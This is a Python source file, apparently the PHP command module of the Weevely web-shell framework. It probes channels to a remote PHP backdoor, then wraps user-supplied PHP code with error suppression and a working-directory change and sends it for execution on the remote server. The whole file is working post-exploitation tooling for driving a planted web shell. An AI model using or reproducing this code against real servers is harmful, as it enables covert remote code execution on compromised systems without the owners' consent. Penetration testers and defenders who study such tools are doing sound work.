from mako.template import Template
from core.module import Module, Status
from core.channels.channel import Channel
from core import config
from core.loggers import log
from core.argparsers import SUPPRESS
import random

class Php(Module):

    """Execute PHP commands."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([
          { 'name' : 'command', 'help' : 'PHP code wrapped in quotes and terminated by semi-comma', 'nargs' : '+' },
          { 'name' : '-prefix-string', 'default' : '@error_reporting(0);' },
          { 'name' : '-post_data' },
          { 'name' : '-postfix-string', 'default' : '' },
          { 'name' : '-raw-response', 'help' : SUPPRESS, 'action' : 'store_true', 'default' : False },
        ])

        self.channel = None

    def _check_interpreter(self, channel):

        rand = str(random.randint(11111, 99999))

        command = 'echo(%s);' % rand
        response, code, error = channel.send(command)

        if rand == response.decode('utf-8'):
            status = Status.RUN
        else:
            # The PHP shell should never return FAIL
            status = Status.IDLE

        return status


    def setup(self):
        """Instauration of the PHP channel. Returns the module status."""

        # Try a single channel if is manually set, else
        # probe every the supported channel from config
        if self.session.get('channel'):
            channels = [ self.session['channel'] ]
        else:
            channels = config.channels

        for channel_name in channels:

            channel = Channel(
                channel_name = channel_name,
                session = self.session
            )

            status = self._check_interpreter(channel)

            if status == Status.RUN:
                self.session['channel'] = channel_name
                self.channel = channel
                break

        log.debug(
            'PHP setup %s %s' % (
                'running' if status == Status.RUN else 'failed',
                'with %s channel' % (channel_name) if status == Status.RUN else ''
            )
        )

        return status

    def run(self):
        """ Run module """

        # This is an unusual slack setup at every execution
        # to check and eventually instance the proper channel
        if self.session['shell_php'].get('status') != Status.RUN: self.setup()

        cwd = self._get_stored_result('cwd', module = 'file_cd', default = '.')
        chdir = '' if cwd == '.' else "chdir('%s');" % cwd

        # Compose command with cwd, pre_command, and post_command option.
        self.args.update({ 'chdir' : chdir })
        command = Template("""${chdir}${prefix_string}${ ' '.join(command) }${postfix_string}""", strict_undefined=True).render(**self.args)

        log.debug('PAYLOAD %s' % command)

        # Send command
        response, code, error = self.channel.send(command)

        if self.args.get('raw_response'):
            return response
        else:
            return response.decode('utf-8', 'replace')
